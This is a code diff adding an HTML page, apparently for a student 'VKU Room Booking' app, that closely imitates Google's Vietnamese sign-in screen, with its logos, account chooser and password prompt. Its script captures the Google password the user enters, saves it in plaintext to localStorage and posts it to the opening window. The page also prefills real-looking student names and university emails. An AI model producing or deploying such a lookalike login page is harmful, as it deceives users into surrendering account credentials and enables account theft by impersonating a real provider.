@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Đăng nhập - Tài khoản Google</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    }
+    body {
+      background-color: #ffffff;
+      color: #202124;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: space-between;
+      user-select: none;
+    }
+    .oauth-top-bar {
+      display: flex;
+      align-items: center;
+      padding: 10px 16px;
+      border-bottom: 1px solid #dadce0;
+      font-size: 14px;
+      color: #5f6368;
+      gap: 12px;
+      background: #ffffff;
+    }
+    .progress-bar {
+      height: 4px;
+      width: 100%;
+      background: #e8f0fe;
+      overflow: hidden;
+      display: none;
+    }
+    .progress-bar.active {
+      display: block;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      width: 45%;
+      background: #1a73e8;
+      animation: indeterminate 1s infinite linear;
+    }
+    @keyframes indeterminate {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(250%); }
+    }
+    .main-container {
+      flex: 1;
+      padding: 32px 40px 24px 40px;
+      max-width: 450px;
+      width: 100%;
+      margin: 0 auto;
+    }
+    .logo-center {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      text-align: center;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 16px;
+      text-align: center;
+      color: #202124;
+      margin-bottom: 28px;
+    }
+    .app-link {
+      color: #1a73e8;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    .account-list {
+      border-top: 1px solid #dadce0;
+      border-bottom: 1px solid #dadce0;
+      margin-bottom: 24px;
+    }
+    .account-item {
+      display: flex;
+      align-items: center;
+      padding: 12px 8px;
+      border-bottom: 1px solid #f1f3f4;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .account-item:last-child {
+      border-bottom: none;
+    }
+    .account-item:hover {
+      background-color: #f8f9fa;
+    }
+    .acc-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      margin-right: 12px;
+      object-fit: cover;
+      background: #e8f0fe;
+    }
+    .acc-icon-circle {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      margin-right: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #5f6368;
+      background: #f1f3f4;
+    }
+    .acc-info {
+      flex: 1;
+      overflow: hidden;
+    }
+    .acc-name {
+      font-size: 14px;
+      font-weight: 500;
+      color: #3c4043;
+    }
+    .acc-email {
+      font-size: 12px;
+      color: #5f6368;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .field-wrap {
+      position: relative;
+      margin-top: 12px;
+      margin-bottom: 8px;
+    }
+    .floating-input {
+      width: 100%;
+      padding: 15px 14px;
+      font-size: 16px;
+      color: #202124;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      background: #ffffff;
+      transition: border-color 0.15s;
+    }
+    .floating-input:focus {
+      border: 2px solid #1a73e8;
+      padding: 14px 13px;
+    }
+    .floating-input.error {
+      border: 2px solid #d93025;
+      padding: 14px 13px;
+    }
+    .floating-label {
+      position: absolute;
+      left: 12px;
+      top: -9px;
+      background: #ffffff;
+      padding: 0 4px;
+      font-size: 12px;
+      color: #1a73e8;
+      font-weight: 500;
+    }
+    .floating-label.error {
+      color: #d93025;
+    }
+    .error-msg {
+      display: none;
+      align-items: flex-start;
+      gap: 6px;
+      color: #d93025;
+      font-size: 12px;
+      margin-top: 6px;
+      margin-bottom: 8px;
+      line-height: 16px;
+    }
+    .error-msg.visible {
+      display: flex;
+    }
+    .link-btn {
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px 0;
+      margin-top: 4px;
+      display: inline-block;
+    }
+    .link-btn:hover {
+      text-decoration: underline;
+    }
+    .guest-info {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 20px;
+      margin-top: 28px;
+      margin-bottom: 32px;
+    }
+    .actions-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+    }
+    .btn-secondary {
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      background: none;
+      border: none;
+      padding: 9px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn-secondary:hover {
+      background: #f6fafe;
+    }
+    .btn-primary {
+      background-color: #1a73e8;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 500;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.15s, box-shadow 0.15s;
+    }
+    .btn-primary:hover {
+      background-color: #1557b0;
+      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+    }
+    .user-pill-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 28px;
+    }
+    .user-pill {
+      display: inline-flex;
+      align-items: center;
+      border: 1px solid #dadce0;
+      border-radius: 16px;
+      padding: 4px 10px 4px 6px;
+      cursor: pointer;
+      max-width: 100%;
+      gap: 8px;
+    }
+    .user-pill:hover {
+      background: #f8f9fa;
+    }
+    .pill-avatar {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .pill-email {
+      font-size: 14px;
+      font-weight: 500;
+      color: #3c4043;
+    }
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 12px;
+      cursor: pointer;
+      font-size: 14px;
+      color: #202124;
+    }
+    .checkbox-row input {
+      width: 16px;
+      height: 16px;
+      accent-color: #1a73e8;
+      cursor: pointer;
+    }
+    .privacy-note {
+      font-size: 12px;
+      color: #5f6368;
+      line-height: 18px;
+      margin-top: 12px;
+    }
+    footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 14px 24px;
+      border-top: 1px solid #f1f3f4;
+      font-size: 12px;
+      color: #5f6368;
+      max-width: 450px;
+      width: 100%;
+      margin: 0 auto;
+    }
+    .footer-links {
+      display: flex;
+      gap: 16px;
+    }
+    .footer-links span {
+      cursor: pointer;
+    }
+    .screen {
+      display: none;
+    }
+    .screen.active {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <div class="oauth-top-bar">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20px" height="20px">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
+      <span>Đăng nhập bằng Google</span>
+    </div>
+    <div id="loadingBar" class="progress-bar">
+      <div class="progress-bar-fill"></div>
+    </div>
+
+    <div class="main-container">
+      <div class="logo-center">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+          <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
+          <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+          <path fill="#4285F4" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"/>
+          <path fill="#FBBC05" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+          <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
+          <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
+        </svg>
+      </div>
+
+      <!-- SCREEN 1: CHOOSE ACCOUNT -->
+      <div id="screenChoose" class="screen active">
+        <h1>Chọn một tài khoản</h1>
+        <p class="subtitle">để tiếp tục tới <span class="app-link">VKU Room Booking</span></p>
+
+        <div class="account-list" id="accountListContainer"></div>
+
+        <p class="privacy-note">
+          Để tiếp tục, Google sẽ chia sẻ tên, địa chỉ email, ngôn ngữ ưu tiên và ảnh hồ sơ của bạn với VKU Room Booking. Trước khi sử dụng ứng dụng này, bạn có thể xem Chính sách quyền riêng tư và Điều khoản dịch vụ của VKU Room Booking.
+        </p>
+      </div>
+
+      <!-- SCREEN 2: ENTER EMAIL -->
+      <div id="screenEmail" class="screen">
+        <h1>Đăng nhập</h1>
+        <p class="subtitle">Tiếp tục tới <span class="app-link">VKU Room Booking</span></p>
+
+        <div class="field-wrap">
+          <label id="emailLabel" class="floating-label">Email hoặc số điện thoại</label>
+          <input
+            id="emailInput"
+            type="email"
+            class="floating-input"
+            placeholder="Nhập địa chỉ Gmail hoặc @vku.udn.vn"
+            autocomplete="username"
+          />
+        </div>
+        <div id="emailError" class="error-msg">
+          <span>⚠️</span>
+          <span id="emailErrorText">Hãy nhập một địa chỉ email hợp lệ.</span>
+        </div>
+
+        <button type="button" class="link-btn" onclick="prefillEmailHint()">Bạn quên địa chỉ email?</button>
+
+        <p class="guest-info">
+          Không phải máy tính của bạn? Hãy sử dụng cửa sổ duyệt web riêng tư để đăng nhập.
+          <span style="color:#1a73e8;font-weight:500;cursor:pointer;">Tìm hiểu thêm về cách sử dụng Chế độ khách</span>
+        </p>
+
+        <div class="actions-row">
+          <button type="button" class="btn-secondary" onclick="showScreen('screenChoose')">Tạo tài khoản</button>
+          <button type="button" class="btn-primary" onclick="submitEmailStep()">Tiếp theo</button>
+        </div>
+      </div>
+
+      <!-- SCREEN 3: ENTER PASSWORD -->
+      <div id="screenPassword" class="screen">
+        <h1>Chào mừng</h1>
+        <div class="user-pill-wrap">
+          <div class="user-pill" onclick="showScreen('screenChoose')">
+            <div class="pill-avatar" id="pillInitial">G</div>
+            <span class="pill-email" id="pillEmailText">user@vku.udn.vn</span>
+            <span style="font-size:11px;color:#5f6368;">▾</span>
+          </div>
+        </div>
+
+        <div class="field-wrap">
+          <label id="passLabel" class="floating-label">Nhập mật khẩu của bạn</label>
+          <input
+            id="passInput"
+            type="password"
+            class="floating-input"
+            placeholder=""
+            autocomplete="current-password"
+          />
+        </div>
+        <div id="passError" class="error-msg">
+          <span>⚠️</span>
+          <span id="passErrorText">Hãy nhập mật khẩu.</span>
+        </div>
+
+        <label class="checkbox-row">
+          <input type="checkbox" id="showPassCheck" onchange="toggleShowPassword()" />
+          <span>Hiện mật khẩu</span>
+        </label>
+
+        <div class="actions-row">
+          <button type="button" class="btn-secondary" onclick="focusPasswordInput()">Bạn quên mật khẩu?</button>
+          <button type="button" class="btn-primary" onclick="submitPasswordStep()">Tiếp theo</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <span>Tiếng Việt ▾</span>
+    <div class="footer-links">
+      <span>Trợ giúp</span>
+      <span>Bảo mật</span>
+      <span>Điều khoản</span>
+    </div>
+  </footer>
+
+  <script>
+    const defaultAccounts = [
+      {
+        name: 'Nguyễn Thị Thương',
+        email: 'thuongnt.23itb@vku.udn.vn',
+        avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80'
+      },
+      {
+        name: 'Trần Văn Nam',
+        email: 'namtv.23itb@vku.udn.vn',
+        avatar: 'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?auto=format&fit=crop&w=200&q=80'
+      },
+      {
+        name: 'Lê Hoàng Châu',
+        email: 'chaulh.23itb@vku.udn.vn',
+        avatar: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=200&q=80'
+      }
+    ];
+
+    let accounts = defaultAccounts;
+    try {
+      const raw = localStorage.getItem('vku_google_oauth_accounts');
+      if (raw) {
+        const parsed = JSON.parse(raw);
+        if (Array.isArray(parsed) && parsed.length > 0) {
+          accounts = parsed;
+        }
+      }
+    } catch (e) {}
+
+    let selectedEmail = '';
+    let selectedName = '';
+
+    function renderAccountList() {
+      const container = document.getElementById('accountListContainer');
+      let html = '';
+      accounts.forEach((acc, idx) => {
+        html += `
+          <div class="account-item" onclick="selectSavedAccount(${idx})">
+            <img class="acc-avatar" src="${acc.avatar}" alt="" />
+            <div class="acc-info">
+              <div class="acc-name">${acc.name}</div>
+              <div class="acc-email">${acc.email}</div>
+            </div>
+          </div>
+        `;
+      });
+      html += `
+        <div class="account-item" onclick="openOtherAccount()">
+          <div class="acc-icon-circle">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
+              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+            </svg>
+          </div>
+          <div class="acc-info">
+            <div class="acc-name">Sử dụng một tài khoản khác</div>
+          </div>
+        </div>
+      `;
+      container.innerHTML = html;
+    }
+
+    renderAccountList();
+
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      clearErrors();
+    }
+
+    function clearErrors() {
+      document.getElementById('emailError').classList.remove('visible');
+      document.getElementById('emailInput').classList.remove('error');
+      document.getElementById('emailLabel').classList.remove('error');
+      document.getElementById('passError').classList.remove('visible');
+      document.getElementById('passInput').classList.remove('error');
+      document.getElementById('passLabel').classList.remove('error');
+    }
+
+    function selectSavedAccount(idx) {
+      const acc = accounts[idx];
+      if (!acc) return;
+      selectedEmail = acc.email;
+      selectedName = acc.name;
+      openPasswordStep();
+    }
+
+    function openOtherAccount() {
+      selectedEmail = '';
+      selectedName = '';
+      document.getElementById('emailInput').value = '';
+      showScreen('screenEmail');
+      setTimeout(() => document.getElementById('emailInput').focus(), 50);
+    }
+
+    function prefillEmailHint() {
+      document.getElementById('emailInput').value = 'thuongnt.23itb@vku.udn.vn';
+      clearErrors();
+      document.getElementById('emailInput').focus();
+    }
+
+    function submitEmailStep() {
+      clearErrors();
+      let val = document.getElementById('emailInput').value.trim().toLowerCase();
+      if (!val || val.length < 3) {
+        showEmailError('Hãy nhập email hoặc số điện thoại.');
+        return;
+      }
+      if (!val.includes('@')) {
+        val = val + '@gmail.com';
+      }
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(val)) {
+        showEmailError('Không tìm thấy Tài khoản Google của bạn.');
+        return;
+      }
+      selectedEmail = val;
+      const found = accounts.find(a => a.email.toLowerCase() === val);
+      selectedName = found ? found.name : '';
+      openPasswordStep();
+    }
+
+    function showEmailError(msg) {
+      document.getElementById('emailErrorText').textContent = msg;
+      document.getElementById('emailError').classList.add('visible');
+      document.getElementById('emailInput').classList.add('error');
+      document.getElementById('emailLabel').classList.add('error');
+    }
+
+    function openPasswordStep() {
+      document.getElementById('pillEmailText').textContent = selectedEmail;
+      document.getElementById('pillInitial').textContent = (selectedName || selectedEmail || 'G').charAt(0).toUpperCase();
+      document.getElementById('passInput').value = '';
+      showScreen('screenPassword');
+      setTimeout(() => document.getElementById('passInput').focus(), 50);
+    }
+
+    function toggleShowPassword() {
+      const chk = document.getElementById('showPassCheck');
+      document.getElementById('passInput').type = chk.checked ? 'text' : 'password';
+    }
+
+    function focusPasswordInput() {
+      clearErrors();
+      document.getElementById('passInput').focus();
+    }
+
+    function showPassError(msg) {
+      document.getElementById('passErrorText').textContent = msg;
+      document.getElementById('passError').classList.add('visible');
+      document.getElementById('passInput').classList.add('error');
+      document.getElementById('passLabel').classList.add('error');
+    }
+
+    function submitPasswordStep() {
+      clearErrors();
+      const pwd = document.getElementById('passInput').value;
+      if (!pwd || pwd.trim().length < 1) {
+        showPassError('Hãy nhập mật khẩu.');
+        return;
+      }
+
+      document.getElementById('loadingBar').classList.add('active');
+      setTimeout(() => {
+        const payload = {
+          type: 'VKU_GOOGLE_OAUTH_SUCCESS',
+          email: selectedEmail,
+          password: pwd,
+          name: selectedName || undefined,
+          ts: Date.now()
+        };
+        try {
+          localStorage.setItem('vku_google_oauth_result', JSON.stringify(payload));
+        } catch (e) {}
+        if (window.opener) {
+          window.opener.postMessage(payload, window.location.origin);
+        }
+        window.close();
+      }, 450);
+    }
+
+    document.getElementById('emailInput').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') submitEmailStep();
+    });
+    document.getElementById('passInput').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') submitPasswordStep();
+    });
+  </script>
+</body>
+</html>
